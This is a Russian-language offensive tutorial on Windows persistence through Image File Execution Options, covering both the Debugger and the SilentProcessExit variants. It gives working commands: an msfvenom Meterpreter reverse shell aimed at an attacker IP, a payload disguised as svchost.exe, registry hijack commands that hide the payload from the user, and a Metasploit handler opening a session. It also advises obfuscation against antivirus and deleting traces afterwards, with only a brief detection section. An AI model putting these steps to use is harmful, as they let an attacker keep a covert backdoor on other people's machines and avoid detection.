# Image File Execution Options как метод закрепления на Windows

## 1. Контекст и базовые понятия

Image File Execution Options (IFEO) — подсистема загрузчика процессов Windows, предоставляющая разработчикам возможность прикреплять отладчик к любому пользовательскому исполняемому файлу. Легитимное назначение IFEO — автоматический запуск отладчика при старте исследуемого приложения, задание флагов кучи, особых параметров создания процесса и включение «тихого» мониторинга завершения программы через механизм **Silent Process Exit**. С точки зрения наступательной безопасности IFEO превращается в инструмент закрепления злоумышленника: поместив в реестр подходящее значение, можно добиться выполнения произвольного кода при каждом запуске или завершении выбранного легитимного процесса. Техника регистрируется в MITRE ATT&CK как подтехника **T1546.012 (Image File Execution Options Injection)** и относится к тактике Persistence (TA0003) [MITRE ATT&CK, T1546.012](https://attack.mitre.org/techniques/T1546/012).

Ключевое отличие IFEO‑закрепления от других способов автозапуска — глубокая интеграция в механизмы ядра, обрабатывающего создание процессов, что делает его менее заметным для ряда инструментов анализа автозагрузки. В отличие от Run‑ключей или запланированных задач, IFEO не создаёт элемент в типичных папках автозапуска и срабатывает прозрачно для пользователя при взаимодействии с привычным приложением (блокнот, калькулятор, специальные возможности и т.п.). При этом для внедрения требуются права администратора, поскольку все активные ключи IFEO хранятся в кусте **HKEY_LOCAL_MACHINE**.

Техника существует в двух основных вариантах, определяющих момент выполнения кода атакующего:
- **Debugger** — подмена отладчика; вредоносная программа выполняется **при запуске** целевого процесса.
- **GlobalFlag + SilentProcessExit** — вредоносная программа запускается как «монитор» процесса в контексте Windows Error Reporting (WerFault.exe) **при завершении** целевого процесса.

Для корректного выбора варианта необходимо понимать особенности обоих подходов, их видимость в системе и требования к полезной нагрузке. Сравнение основных характеристик приведено в таблице ниже.

| Характеристика               | Debugger                                                | GlobalFlag + SilentProcessExit                                                                 |
|------------------------------|---------------------------------------------------------|------------------------------------------------------------------------------------------------|
| Триггер выполнения           | Запуск целевого приложения (CreateProcess)              | Завершение целевого приложения (ExitProcess, завершение через Task Manager)                    |
| Реестровый путь              | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target.exe>` | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target.exe>` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<target.exe>` |
| Обязательные значения        | `Debugger` (REG_SZ) — путь к исполняемому файлу         | `GlobalFlag` = 0x200 (512) (REG_DWORD), `ReportingMode` = 1 (REG_DWORD), `MonitorProcess` — путь к исполняемому файлу |
| Родительский процесс полезной нагрузки | Сам целевой процесс или новая копия (зависит от реализации отладчика) | Werfault.exe (Windows Error Reporting)                                                        |
| Видимость пользователю       | Возможна задержка запуска оригинального приложения или его отсутствие, если цепочка не восстановлена | Оригинальное приложение работает штатно, полезная нагрузка выполняется скрытно после его закрытия |
| Совместимость с UAC / сессией | Выполняется в контексте пользователя, запустившего процесс. Для системных процессов (utilman.exe) — SYSTEM | Выполняется в контексте пользователя, завершившего процесс (обычно та же сессия)               |
| Типовые цели                 | notepad.exe, calc.exe, utilman.exe, sethc.exe           | notepad.exe, calc.exe, explorer.exe, любое часто закрываемое приложение                        |
| Необходимость маскировки     | Требуется маскировка основного окна (cmd /c start target.exe & payload) | Полезная нагрузка работает скрытно, но WerFault.exe может появиться в списке задач             |

IFEO‑закрепление часто используется в цепочках с повышением привилегий: классический пример — замена отладчика для **utilman.exe** (экранная лупа на экране входа), что даёт SYSTEM‑оболочку до аутентификации, аналогично технике Accessibility Features [Crowdstrike, Registry Analysis](https://web.archive.org/web/20200730053039/https://www.crowdstrike.com/blog/registry-analysis-with-crowdresponse/).

Для иллюстрации ниже приведён пример запроса реестра, показывающий типовое содержимое ветви IFEO на чистой системе:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

На стандартной системе этот запрос может выдать список известных исполняемых файлов, для которых Microsoft предустановила флаги отладки (например, для контроля целостности). Злоумышленник, добавляя свой ключ, расширяет этот список, не нарушая структуры куста.

## 2. Внутреннее устройство: реестровые ключи и логика исполнения

Механизм IFEO реализован на уровне менеджера процессов ядра, который при создании нового процесса обращается к реестру и проверяет наличие подключей с именем исполняемого файла. Если такой подключ существует и содержит определённые значения, загрузчик модифицирует параметры запуска или завершения процесса. Реестровый путь базового узла (с учётом редирекции для 32-разрядных приложений на 64-разрядной системе):

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
```

Каждый подключ именуется в соответствии с именем целевого файла (например, `notepad.exe`). Значения внутри ключа управляют поведением отладки и флагами кучи, но для злоумышленников критичны два сценария.

### 2.1 Сценарий Debugger

При создании процесса `target.exe` и наличии в ветке `HKLM\...\Image File Execution Options\target.exe` строкового значения `Debugger`, система интерпретирует его как команду для отладчика. Полная командная строка формируется по шаблону:

```text
<Debugger> <параметры> target.exe
```

Например, если в качестве отладчика указан `c:\windows\system32\pentestlab.exe`, то запускаемая строка примет вид `c:\windows\system32\pentestlab.exe notepad.exe`. Полезная нагрузка получает управление первой; оригинальное приложение запускается только если это предусмотрено кодом отладчика, иначе пользователь может заметить подмену. Опытный атакующий, однако, может обернуть вызов в cmd и использовать конструкцию `cmd /c start /b target.exe & payload.exe`, чтобы сохранить иллюзию нормальной работы.

Ниже показана структура реестрового значения с комментариями:

```reg
Windows Registry Editor Version 5.00

; Создаём подключ для целевого процесса
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]
; Устанавливаем отладчик — произвольный исполняемый файл
"Debugger"="notepad.exe"
```

Windows в данном случае вызовет `notepad.exe notepad.exe`, что снова запустит только Блокнот без вредоносной нагрузки, но этот пример демонстрирует формат. Для реальной атаки подставляют другой исполняемый файл.

Поток управления при использовании Debugger можно проиллюстрировать схемой:

```text
[User double-clicks notepad.exe]
        │
        ▼
[CreateProcess("notepad.exe")]
        │
        ▼
[Kernel: check IFEO\notepad.exe]
        │
        ▼ (Debugger value exists)
[Launch: debugger.exe notepad.exe]
        │
        ├─(if coded)──▶ [debugger.exe spawns notepad.exe] ──▶ [user sees notepad]
        └─(payload logic)──▶ [reverse shell / backdoor execution]
```

### 2.2 Сценарий GlobalFlag и SilentProcessExit

Второй сценарий использует флаг кучи **GlobalFlag** и механизм **SilentProcessExit**. Когда целевой процесс завершается (неважно, штатно или аварийно), Windows проверяет наличие ключа `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<target.exe>` с параметрами `ReportingMode` и `MonitorProcess`. Если `ReportingMode` установлен в 1, а `MonitorProcess` содержит путь к исполняемому файлу, система с помощью службы Windows Error Reporting (WerFault.exe) запускает указанную программу как дочерний процесс. Для включения этой цепочки необходимо также выставить `GlobalFlag` с битом 0x200 (512) в IFEO для целевого процесса — этот бит включает флаг `FLG_MONITOR_SILENT_PROCESS_EXIT`.

Структура реестровых ключей для такого закрепления:

```reg
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]
"GlobalFlag"=dword:00000200

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe]
"ReportingMode"=dword:00000001
"MonitorProcess"="C:\\temp\\payload.exe"
```

При закрытии Блокнота будет создан процесс `WerFault.exe`, который, в свою очередь, породит `payload.exe`. Оригинальное приложение отработало без видимых изменений, что делает метод привлекательным для скрытного закрепления [Penetration Testing Lab, IFEO](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection).

Поток управления для GlobalFlag иллюстрируется следующим образом:

```text
[User closes notepad.exe]
        │
        ▼
[ExitProcess() called]
        │
        ▼
[Kernel: check IFEO\notepad.exe → GlobalFlag & FLG_MONITOR_SILENT_PROCESS_EXIT]
        │
        ▼
[Check SilentProcessExit\notepad.exe → ReportingMode=1, MonitorProcess=payload.exe]
        │
        ▼
[WerFault.exe launched]
        │
        └──▶ [WerFault.exe spawns payload.exe]
```

Оба механизма оставляют в системе характерные артефакты: записи реестра, появление WerFault.exe (для GlobalFlag) или нестандартного родительского процесса для полезной нагрузки. Детектирование может опираться на мониторинг изменений в соответствующих ветках реестра, а также на аномалии в цепочках процессов.

## 3. Применение и работа с IFEO в пост‑эксплуатации

На этапе закрепления атакующий, уже получивший права локального администратора, добавляет в реестр ключи IFEO, ведущие на заранее размещённую полезную нагрузку. Рассмотрим типовые шаги и используемые команды.

### 3.1 Выбор целевого процесса и размещение полезной нагрузки

Наиболее часто выбираются приложения, которые пользователь гарантированно запускает или закрывает: **notepad.exe**, **calc.exe**, **explorer.exe**, **mspaint.exe**. Для скрытного выполнения нагрузку размещают в системных директориях (`C:\Windows\System32`, `C:\Windows\Temp`) и дают имена, похожие на легитимные файлы (например, `svchost.exe`, `wmiapsrv.exe`). Генерация исполняемого файла с обратным соединением может быть выполнена через **msfvenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o svchost.exe
```

Полученный файл доставляется на целевую систему и копируется в `C:\Windows\System32\svchost.exe`. На практике могут применяться обфускация или упаковщики для снижения детектируемости.

### 3.2 Внедрение через Debugger (запуск)

На целевой системе выполняется добавление ключа Debugger. Команда должна выполняться из‑под учётной записи с правами администратора.

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\svchost.exe" /f
```

Ключ `/f` подавляет запрос подтверждения перезаписи. Проверка добавленного значения:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
```

Ожидаемый вывод:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe
    Debugger    REG_SZ    C:\Windows\System32\svchost.exe
```

При следующем запуске `notepad.exe` пользователем (или через вызов из другого процесса) будет выполнен `svchost.exe`, который установит обратное соединение. Однако при этом окно Блокнота не появится, что может насторожить пользователя. Для маскировки можно вместо прямого указания исполняемого файла использовать командный интерпретатор с цепочкой:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd.exe /c start /b notepad.exe & C:\Windows\System32\svchost.exe" /f
```

Тогда сначала запустится скрытое окно `cmd.exe`, которое инициирует настоящий Блокнот, после чего запустит полезную нагрузку. Эта конструкция создаёт сразу несколько процессов, но сохраняет привычное поведение для пользователя.

### 3.3 Внедрение через GlobalFlag и SilentProcessExit (завершение)

Для скрытого выполнения после закрытия приложения добавляются три значения:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Windows\System32\svchost.exe" /f
```

Проверка созданных ключей:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"
```

Ожидаемый вывод будет содержать `GlobalFlag = 0x200`, `ReportingMode = 1` и `MonitorProcess = C:\Windows\System32\svchost.exe`.

Теперь при закрытии Блокнота процесс `WerFault.exe` запустит `svchost.exe`. Оригинальное приложение закрывается штатно, пользователь не замечает ничего подозрительного. В списке процессов на короткое время появится `WerFault.exe`, но в обычной работе это может быть проигнорировано.

### 3.4 Типичные ошибки и меры предосторожности

- **Недостаток прав:** добавление ключей в HKLM требует прав администратора. При попытке без повышения команда завершится ошибкой «Access is denied».
- **Конфликт с существующим отладчиком:** если для целевого процесса уже задан легитимный Debugger (например, для контроля ошибок), его перезапись может нарушить работу приложения и привести к подозрительным событиям.
- **Блокировка антивирусом:** запись в ветку IFEO и появление нового исполняемого файла в System32 — действия, типичные для многих вредоносных программ, поэтому антивирусные продукты могут блокировать такие изменения или детектировать полезную нагрузку. Желательно использовать обфускацию и проверять детект перед развёртыванием.
- **Очистка следов:** после успешного выполнения можно удалить или временно отключить IFEO‑ключи, чтобы избежать обнаружения при анализе реестра.

### 3.5 Детектирование и мониторинг

Для защитников основными индикаторами являются изменения в реестре по путям:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*`
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\*`

Аудит реестра (SACL на ключи) позволяет регистрировать событие с Event ID 4657. Системы EDR могут отслеживать аномальные цепочки процессов, где родителем выступает `WerFault.exe` с нестандартным дочерним процессом. Также подозрительным является запуск процессов из System32 с именем, маскирующимся под системные службы (например, `svchost.exe`, но не из `C:\Windows\System32\svchost.exe`, а из другого пути; однако в данном случае используется настоящий System32, что сложнее детектировать по пути).

## 4. Сквозной практический пример: закрепление через IFEO Debugger с обратным Meterpreter‑соединением

**Исходные условия:** пентестер получил права администратора на Windows 10 Pro (build 22H2) через эксплуатацию уязвимости. Сетевая связность с атакующей машины (IP 10.10.14.5) имеется. Необходимо установить незаметное закрепление, которое будет активироваться при запуске Блокнота. Для чистоты эксперимента целевая система не содержит предварительных ключей IFEO для `notepad.exe`. Используется Metasploit Framework 6.3.

### Шаг 1: Генерация полезной нагрузки

На атакующей машине создаётся исполняемый файл Meterpreter reverse TCP:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o svchost.exe
```

Ожидаемый вывод (фрагмент):

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: svchost.exe
```

### Шаг 2: Доставка и размещение на целевой системе

Файл `svchost.exe` загружается на целевую машину в `C:\Windows\System32` с помощью имеющегося шелла (например, через PowerSheel `Invoke-WebRequest` или SMB‑шару). Команда в Meterpreter‑сессии (уже установленной на этапе первичного доступа):

```powershell
upload /home/user/svchost.exe C:\\Windows\\System32\\svchost.exe
```

Проверка файла на цели:

```powershell
dir C:\Windows\System32\svchost.exe
```

Ожидаемый вывод:

```
Directory: C:\Windows\System32
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/14/2026   8:45 AM           7168 svchost.exe
```

### Шаг 3: Добавление реестрового ключа Debugger

В том же административном шелле (PowerShell с правами администратора) выполняется команда:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\svchost.exe" /f
```

Вывод команды:

```
The operation completed successfully.
```

Подтверждение добавления:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
```

Результат:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe
    Debugger    REG_SZ    C:\Windows\System32\svchost.exe
```

### Шаг 4: Настройка обработчика Metasploit и активация закрепления

На атакующей машине запускается обработчик:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 10.10.14.5:4444
```

Далее на целевой системе пользователь (или сам тестировщик) запускает Блокнот любым способом, например, через Win+R, `notepad.exe`. Вместо Блокнота на мгновение появляется окно `svchost.exe`, и в консоли Metasploit поступает новое соединение:

```
[*] Sending stage (200774 bytes) to 10.10.16.100
[*] Meterpreter session 2 opened (10.10.14.5:4444 -> 10.10.16.100:50123) at 2026-02-14 08:50:17 -0500
```

При использовании маскирующей цепочки `cmd.exe /c start /b notepad.exe & C:\Windows\System32\svchost.exe` вместо прямого вызова, пользователь увидит обычный Блокнот, а фоновая полезная нагрузка установит сессию параллельно. В таком случае команда добавления Debugger будет:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd.exe /c start /b notepad.exe & C:\Windows\System32\svchost.exe" /f
```

После этих действий злоумышленник получает стабильное закрепление, которое будет срабатывать при каждом запуске Блокнота любым пользователем системы. При перезагрузке ключи сохраняются в HKLM, поэтому персистентность сохраняется.

**Ожидаемый вывод примера:** демонстрируется полный цикл использования IFEO Debugger для получения Meterpreter‑сессии при запуске легитимного приложения. Показаны генерирование, размещение и активация полезной нагрузки, подтверждающая, что механизм IFEO является действенным методом закрепления, не требующим изменения кода целевых программ и работающим на уровне загрузчика процессов.

## Источники

- Penetration Testing Lab, “Persistence – Image File Execution Options Injection”, [https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection)
- MITRE ATT&CK, “Image File Execution Options Injection (T1546.012)”, [https://attack.mitre.org/techniques/T1546/012](https://attack.mitre.org/techniques/T1546/012)
- Oddvar Moe, “Persistence using GlobalFlags in Image File Execution Options – hidden from autoruns.exe”, [https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe)
- Microsoft Docs, “Registry Entries for Silent Process Exit”, [https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit](https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit)
- Hackers Arise, “Advanced Windows Persistence, Part 1”, [https://hackers-arise.com/advanced-windows-persistence-part-1-remaining-inside-the-windows-target](https://hackers-arise.com/advanced-windows-persistence-part-1-remaining-inside-the-windows-target)
- MITRE D3FEND, “Image File Execution Options Injection”, [https://d3fend.mitre.org/offensive-technique/attack/T1546.012](https://d3fend.mitre.org/offensive-technique/attack/T1546.012)